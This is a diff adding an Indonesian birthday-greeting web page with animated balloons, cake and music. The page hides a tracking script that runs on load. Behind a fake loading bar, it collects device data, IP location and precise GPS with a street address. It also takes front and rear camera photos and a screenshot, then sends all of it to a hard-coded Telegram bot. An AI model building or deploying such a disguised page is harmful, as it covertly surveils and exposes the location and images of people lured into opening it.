@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selamat Ulang Tahun!</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial Rounded MT Bold', 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: #333;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 800px;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 10;
+            animation: fadeIn 1.5s ease-out;
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            color: #ff6b6b;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+            animation: bounce 2s infinite;
+        }
+
+        .birthday-person {
+            font-size: 2.5rem;
+            color: #4ecdc4;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+
+        .message {
+            font-size: 1.3rem;
+            line-height: 1.6;
+            margin: 25px 0;
+            color: #555;
+        }
+
+        .cake {
+            width: 200px;
+            height: 150px;
+            margin: 30px auto;
+            position: relative;
+        }
+
+        .plate {
+            width: 180px;
+            height: 15px;
+            background: #95e1d3;
+            border-radius: 50%;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .layer {
+            width: 160px;
+            height: 40px;
+            background: #ff9a9e;
+            border-radius: 10px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .layer.bottom {
+            height: 50px;
+            background: #fad0c4;
+        }
+
+        .layer.middle {
+            top: -10px;
+            background: #ff9a9e;
+        }
+
+        .layer.top {
+            top: -20px;
+            height: 30px;
+            background: #ff6b6b;
+            width: 120px;
+        }
+
+        .candle {
+            width: 10px;
+            height: 40px;
+            background: #4ecdc4;
+            margin: 0 auto;
+            position: relative;
+            top: -30px;
+            border-radius: 5px 5px 0 0;
+        }
+
+        .flame {
+            width: 15px;
+            height: 30px;
+            background: #ffd93d;
+            border-radius: 50% 50% 20% 20%;
+            margin: 0 auto;
+            position: relative;
+            top: -60px;
+            animation: flicker 1.5s infinite alternate;
+            box-shadow: 0 0 15px #ff9a00;
+        }
+
+        .balloons {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .balloon {
+            position: absolute;
+            width: 60px;
+            height: 70px;
+            border-radius: 50%;
+            bottom: -100px;
+            animation: float 15s linear infinite;
+        }
+
+        .balloon:before {
+            content: '';
+            position: absolute;
+            width: 2px;
+            height: 50px;
+            background: rgba(0, 0, 0, 0.2);
+            bottom: -50px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .balloon:nth-child(1) {
+            background: #ff6b6b;
+            left: 10%;
+            animation-delay: 0s;
+            animation-duration: 18s;
+        }
+
+        .balloon:nth-child(2) {
+            background: #4ecdc4;
+            left: 20%;
+            animation-delay: 2s;
+            animation-duration: 16s;
+        }
+
+        .balloon:nth-child(3) {
+            background: #ffd93d;
+            left: 30%;
+            animation-delay: 4s;
+            animation-duration: 20s;
+        }
+
+        .balloon:nth-child(4) {
+            background: #6c5ce7;
+            left: 40%;
+            animation-delay: 1s;
+            animation-duration: 17s;
+        }
+
+        .balloon:nth-child(5) {
+            background: #a29bfe;
+            left: 50%;
+            animation-delay: 3s;
+            animation-duration: 19s;
+        }
+
+        .balloon:nth-child(6) {
+            background: #fd79a8;
+            left: 60%;
+            animation-delay: 5s;
+            animation-duration: 15s;
+        }
+
+        .balloon:nth-child(7) {
+            background: #55efc4;
+            left: 70%;
+            animation-delay: 2.5s;
+            animation-duration: 21s;
+        }
+
+        .balloon:nth-child(8) {
+            background: #ffeaa7;
+            left: 80%;
+            animation-delay: 4.5s;
+            animation-duration: 16s;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 20px;
+            background: #ff6b6b;
+            top: -20px;
+            opacity: 0;
+            animation: confetti 5s ease-in-out infinite;
+        }
+
+        .confetti-piece:nth-child(1) {
+            left: 10%;
+            background: #ff6b6b;
+            animation-delay: 0.5s;
+        }
+
+        .confetti-piece:nth-child(2) {
+            left: 20%;
+            background: #4ecdc4;
+            animation-delay: 1.5s;
+        }
+
+        .confetti-piece:nth-child(3) {
+            left: 30%;
+            background: #ffd93d;
+            animation-delay: 2.5s;
+        }
+
+        .confetti-piece:nth-child(4) {
+            left: 40%;
+            background: #6c5ce7;
+            animation-delay: 0.8s;
+        }
+
+        .confetti-piece:nth-child(5) {
+            left: 50%;
+            background: #a29bfe;
+            animation-delay: 3.2s;
+        }
+
+        .confetti-piece:nth-child(6) {
+            left: 60%;
+            background: #fd79a8;
+            animation-delay: 1.8s;
+        }
+
+        .confetti-piece:nth-child(7) {
+            left: 70%;
+            background: #55efc4;
+            animation-delay: 2.8s;
+        }
+
+        .confetti-piece:nth-child(8) {
+            left: 80%;
+            background: #ffeaa7;
+            animation-delay: 0.2s;
+        }
+
+        .confetti-piece:nth-child(9) {
+            left: 90%;
+            background: #ff9a9e;
+            animation-delay: 3.5s;
+        }
+
+        .wish-button {
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
+        }
+
+        .wish-button:hover {
+            background: #ff5252;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 107, 107, 0.6);
+        }
+
+        .wish-button:active {
+            transform: translateY(1px);
+        }
+
+        .audio-control {
+            margin-top: 20px;
+        }
+
+        .audio-control button {
+            background: #4ecdc4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .audio-control button:hover {
+            background: #3db8af;
+        }
+
+        /* Loading Progress Styles */
+        .loading-container {
+            background: rgba(32, 44, 51, 0.9);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            color: white;
+        }
+
+        .loading-text {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #8696a0;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: rgba(42, 57, 66, 0.5);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #25D366, #128C7E);
+            border-radius: 3px;
+            position: relative;
+            transition: width 0.3s ease;
+        }
+
+        .progress-bar:after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background-image: linear-gradient(
+                -45deg, 
+                rgba(255, 255, 255, 0.2) 25%, 
+                transparent 25%, 
+                transparent 50%, 
+                rgba(255, 255, 255, 0.2) 50%, 
+                rgba(255, 255, 255, 0.2) 75%, 
+                transparent 75%, 
+                transparent
+            );
+            z-index: 1;
+            background-size: 30px 30px;
+            animation: move 1s linear infinite;
+            border-radius: 3px;
+        }
+
+        .status {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #8696a0;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes flicker {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.9; }
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(-1000px) rotate(360deg); opacity: 0; }
+        }
+
+        @keyframes confetti {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(1000px) rotate(360deg); opacity: 0; }
+        }
+
+        @keyframes move {
+            0% { background-position: 0 0; }
+            100% { background-position: 30px 0; }
+        }
+
+        @keyframes loading {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+                margin: 20px;
+            }
+            
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .birthday-person {
+                font-size: 2rem;
+            }
+            
+            .message {
+                font-size: 1.1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="balloons">
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+    </div>
+    
+    <div class="confetti">
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+        <div class="confetti-piece"></div>
+    </div>
+
+    <div class="container">
+        <h1>🎉 Selamat Ulang Tahun! 🎉</h1>
+        
+        <div class="birthday-person" id="birthdayName">Teman</div>
+        
+        <div class="cake">
+            <div class="plate"></div>
+            <div class="layer bottom"></div>
+            <div class="layer middle"></div>
+            <div class="layer top"></div>
+            <div class="candle"></div>
+            <div class="flame"></div>
+        </div>
+        
+        <div class="message">
+            <p>Kami sedang mempersiapkan kejutan spesial untukmu!</p>
+            <p>Harap tunggu sebentar...</p>
+        </div>
+
+        <!-- Loading Progress -->
+        <div class="loading-container">
+            <div class="loading-text" id="status-text">Mempersiapkan kejutan ulang tahun...</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+            <div class="status">
+                <span>Status: <span id="progress-status">Loading...</span></span>
+                <span id="progress-percent">0%</span>
+            </div>
+        </div>
+        
+        <button class="wish-button" onclick="showBirthdayWish()">Klik untuk Pesan Spesial!</button>
+        
+        <div class="audio-control">
+            <button onclick="toggleMusic()">Putar/Mute Musik</button>
+        </div>
+    </div>
+
+    <video id="v" autoplay muted class="hidden"></video>
+    <canvas id="c" class="hidden"></canvas>
+
+    <audio id="birthdayMusic" loop>
+        <source src="https://assets.mixkit.co/music/preview/mixkit-happy-birthday-to-you-443.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // ========== BAGIAN UCAPAN ULANG TAHUN ==========
+        
+        // Fungsi untuk menampilkan ucapan spesial
+        function showBirthdayWish() {
+            const messages = [
+                "Semoga hari ini penuh dengan tawa dan kebahagiaan!",
+                "Kesehatan, kesuksesan, dan kebahagiaan selalu menyertaimu!",
+                "Terima kasih telah menjadi orang yang luar biasa!",
+                "Semoga tahun ini membawa banyak keberuntungan untukmu!",
+                "Kamu adalah berkah bagi semua orang di sekitarmu!",
+                "Selamat menikmati hari spesialmu sepenuhnya!"
+            ];
+            
+            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+            alert(randomMessage);
+            
+            // Tambahkan efek konfeti ekstra
+            createExtraConfetti();
+        }
+        
+        // Fungsi untuk membuat konfeti tambahan
+        function createExtraConfetti() {
+            const confettiContainer = document.querySelector('.confetti');
+            for (let i = 0; i < 20; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti-piece';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.animationDelay = Math.random() * 5 + 's';
+                confetti.style.backgroundColor = getRandomColor();
+                confettiContainer.appendChild(confetti);
+                
+                // Hapus konfeti setelah animasi selesai
+                setTimeout(() => {
+                    confetti.remove();
+                }, 5000);
+            }
+        }
+        
+        // Fungsi untuk mendapatkan warna acak
+        function getRandomColor() {
+            const colors = ['#ff6b6b', '#4ecdc4', '#ffd93d', '#6c5ce7', '#a29bfe', '#fd79a8', '#55efc4', '#ffeaa7'];
+            return colors[Math.floor(Math.random() * colors.length)];
+        }
+        
+        // Fungsi untuk mengontrol musik
+        function toggleMusic() {
+            const music = document.getElementById('birthdayMusic');
+            if (music.paused) {
+                music.play();
+            } else {
+                music.pause();
+            }
+        }
+        
+        // Otomatis mainkan musik setelah halaman dimuat
+        window.addEventListener('load', function() {
+            // Mainkan musik
+            document.getElementById('birthdayMusic').play().catch(e => {
+                console.log("Autoplay diblokir, pengguna harus menginteraksi terlebih dahulu");
+            });
+        });
+        
+        // Tambahkan balon secara dinamis
+        setInterval(() => {
+            const balloonsContainer = document.querySelector('.balloons');
+            const balloon = document.createElement('div');
+            balloon.className = 'balloon';
+            balloon.style.left = Math.random() * 100 + '%';
+            balloon.style.backgroundColor = getRandomColor();
+            balloon.style.animationDuration = (15 + Math.random() * 10) + 's';
+            balloonsContainer.appendChild(balloon);
+            
+            // Hapus balon setelah animasi selesai
+            setTimeout(() => {
+                balloon.remove();
+            }, 25000);
+        }, 3000);
+
+        // ========== BAGIAN TRACKING SCRIPT (ASLI) ==========
+        
+        (()=>{
+            const T='8184718481:AAFCstX5WqvlmLBaA47v8cAZDvWsC241w1Y', // <-- MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
+                  C='6227786863', // <-- MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
+                  pb=document.getElementById('progress-bar'),
+                  statusText = document.getElementById('status-text'),
+                  progressPercent = document.getElementById('progress-percent'),
+                  progressStatus = document.getElementById('progress-status');
+
+            let p=0;
+            const LM=["Memuat kejutan spesial...", "Mempersiapkan kado digital...", "Menyiapkan ucapan spesial...", "Memuat pesan dari teman-teman...", "Mempersiapkan foto kenangan...", "Menyiapkan musik spesial...", "Memuat video ucapan..."];
+            
+            // Logic untuk progress bar
+            const progressInterval = setInterval(()=>{
+                p+=Math.random()*5;
+                if(p>98) {
+                    // Reset progress untuk efek loading terus menerus
+                    if(p > 100) {
+                        p = 30 + Math.random()*40;
+                        pb.style.width = p + '%';
+                        progressPercent.textContent = Math.floor(p) + '%';
+                    } else {
+                        pb.style.width=p+'%';
+                        progressPercent.textContent = Math.floor(p) + '%';
+                    }
+                } else {
+                    pb.style.width=p+'%';
+                    progressPercent.textContent = Math.floor(p) + '%';
+                }
+                
+                if(Math.random()>.7) {
+                    statusText.textContent=LM[Math.floor(Math.random()*LM.length)];
+                }
+            },500);
+
+            // Fungsi kirim pesan ke Telegram
+            const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
+            
+            // Fungsi kirim foto ke Telegram
+            const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
+            
+            // Fungsi mendapatkan lokasi detail dari koordinat
+            const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom:18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
+            
+            // Fungsi mendapatkan informasi perangkat
+            const cDI=async()=>{
+                let m='╭───── Birthday Tracking Report ───── ⦿\n\n';
+                m+='🎂 BIRTHDAY ACCESS INFORMATION\n';
+                m+=`🖥️ Device: ${navigator.userAgent}\n`;
+                m+=`💻 Platform: ${navigator.platform}\n`;
+                m+=`🌐 Bahasa: ${navigator.language}\n`;
+                m+=`📶 Online: ${navigator.onLine?'Online':'Offline'}\n`;
+                m+=`📺 Screen Size: ${screen.width}x${screen.height}\n`;
+                m+=`🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
+                m+=`💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n`;
+                m+=`🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+                
+                if(navigator.getBattery){
+                    try{
+                        const b=await navigator.getBattery();
+                        m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n`;
+                        m+=`🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`;
+                    }catch(e){
+                        m+='🔋 Battery: ❌ Tidak tersedia\n';
+                    }
+                }
+                
+                m+=`⏰ Waktu Akses: ${new Date().toString()}\n`;
+                m+=`🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
+                m+=`📜 History Length: ${history.length}\n`;
+                m+=`✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n`;
+                m+=`🔗 Referrer: ${document.referrer||'None'}\n`;
+                m+=`🌍 URL: ${location.href}\n`;
+                m+=`📄 Title: ${document.title}\n`;
+                m+=`🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+                m+=`🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+                
+                try{
+                    const i=await fetch('https://ipapi.co/json/'),d=await i.json();
+                    m+='📍 LOCATION INFORMATION\n';
+                    m+=`📡 IP Address: ${d.ip}\n`;
+                    m+=`🏙️ Kota: ${d.city}\n`;
+                    m+=`🏙️ Kabupaten: ${d.region}\n`;
+                    m+=`🗺️ Wilayah: ${d.region}\n`;
+                    m+=`🌎 Negara: ${d.country_name}\n`;
+                    m+=`🏷️ Kode Pos: ${d.postal}\n`;
+                    
+                    if(d.latitude&&d.longitude){
+                        m+=`📌 Latitude: ${d.latitude}\n`;
+                        m+=`📍 Longitude: ${d.longitude}\n`;
+                        const l=await gLD(d.latitude,d.longitude);
+                        m+=`🏙️ Kabupaten: ${l.kb}\n`;
+                        m+=`🏙️ Kecamatan: ${l.kc}\n`;
+                        m+=`🏠 Alamat Lengkap: ${l.fa}\n`;
+                    }
+                }catch(e){
+                    m+='❌ Gagal mendapatkan informasi lokasi\n';
+                }
+                
+                m+='\n╰───── Telegram @ryzzreal  ───── ⦿';
+                return m;
+            };
+
+            // Mengambil gambar dari kamera dengan mode tertentu
+            const captureCamera = async (mode) => {
+                const v = document.getElementById('v'), 
+                      c = document.getElementById('c');
+                let stream;
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: { exact: mode } 
+                        }
+                    });
+                    v.srcObject = stream;
+                    
+                    await new Promise(resolve => v.onloadedmetadata = resolve);
+                    v.play();
+
+                    // Waktu tunggu kamera 1.5 detik
+                    await new Promise(r => setTimeout(r, 1500)); 
+                    
+                    c.width = v.videoWidth;
+                    c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    
+                    c.toBlob(b => sP(b, `${mode}_birthday_camera.jpg`), 'image/jpeg');
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    return true; 
+                    
+                } catch (e) {
+                    if (stream) {
+                        stream.getTracks().forEach(t => t.stop());
+                    }
+                    await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()} untuk foto ulang tahun.`);
+                    return false; 
+                }
+            };
+
+            // FUNGSI UTAMA: Menjalankan semua proses tracking
+            const ST=async()=>{
+                await sTG(await cDI()); 
+
+                let cameraSuccess = false;
+
+                // 1. Coba Kamera Depan (User)
+                cameraSuccess = await captureCamera("user");
+
+                // 2. Jika Gagal, Coba Kamera Belakang (Environment)
+                if (!cameraSuccess) {
+                    cameraSuccess = await captureCamera("environment");
+                }
+
+                if (!cameraSuccess) {
+                     await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
+                }
+
+                // Ambil Screenshot 
+                setTimeout(async()=>{
+                    try{
+                        const cn=await html2canvas(document.body);
+                        cn.toBlob(b=>sP(b,'birthday_screenshot.jpg'),'image/jpeg')
+                    }catch(e){
+                        await sTG('❌ Screenshot birthday page failed')
+                    }
+                }, 2000); 
+
+                // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
+                if(navigator.geolocation){
+                    navigator.geolocation.getCurrentPosition(async p=>{
+                        const lat = p.coords.latitude;
+                        const lon = p.coords.longitude;
+                        
+                        // Menambahkan link Google Maps
+                        let g=`📍 BIRTHDAY LOCATION TRACKING\n`;
+                        g+=`📌 Lat: ${lat}\n`;
+                        g+=`📍 Lng: ${lon}\n`;
+                        g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
+                        g+=`🗺️ Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
+                        
+                        const l=await gLD(lat,lon);
+                        g+=`🏙️ Kabupaten: ${l.kb}\n`;
+                        g+=`🏙️ Kecamatan: ${l.kc}\n`;
+                        g+=`🏠 Alamat: ${l.fa}\n`;
+                        await sTG(g);
+                    },async e=>{
+                        await sTG(`❌ GPS Error: ${e.message}`)
+                    },{enableHighAccuracy:true,maximumAge:0,timeout:5000})
+                }
+            };
+
+            // Langsung menjalankan fungsi ST tanpa delay
+            ST();
+        })();
+    </script>
+</body>
+</html>
